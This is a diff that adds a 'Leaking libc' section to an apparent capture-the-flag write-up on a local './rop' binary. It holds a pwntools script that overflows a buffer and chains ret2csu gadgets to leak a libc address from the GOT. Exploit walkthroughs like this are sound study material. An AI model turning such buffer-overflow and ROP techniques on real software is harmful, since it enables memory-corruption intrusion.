@@ -140,3 +140,42 @@ To go for ret2plt `system` and `/bin/sh` have to be present already.
 ❯ objdump -d ./rop | grep -i system
 ```
 No results, so it's likely ret2libc.
+
+### Leaking libc
+
+I set up this python script to leak libc
+```Python
+from pwn import *
+
+elf = ELF('./rop')
+p = process('./rop')
+
+gadget1     = 0x40060a
+rbx_value   = 0x00
+rbp_value   = 0x01
+r12_value   = 0x601018
+r13_value   = 0x01
+r14_value   = 0x601018
+r15_value   = 0x08
+gadget2     = 0x4005f0
+main        = 0x400537
+
+payload  = b'A' * 72
+payload += p64(gadget1)
+payload += p64(rbx_value)
+payload += p64(rbp_value)
+payload += p64(r12_value)
+payload += p64(r13_value)
+payload += p64(r14_value)
+payload += p64(r15_value)
+payload += p64(gadget2)
+payload += b'B' * 56
+payload += p64(main)
+
+p.sendline(payload)
+p.recvuntil(b'Input: ')   # eat first prompt
+
+# Read raw bytes, don't stop at null
+leaked = p.recv(8, timeout=1)
+print(f"Leaked ({len(leaked)} bytes): {leaked.hex()}")
+```
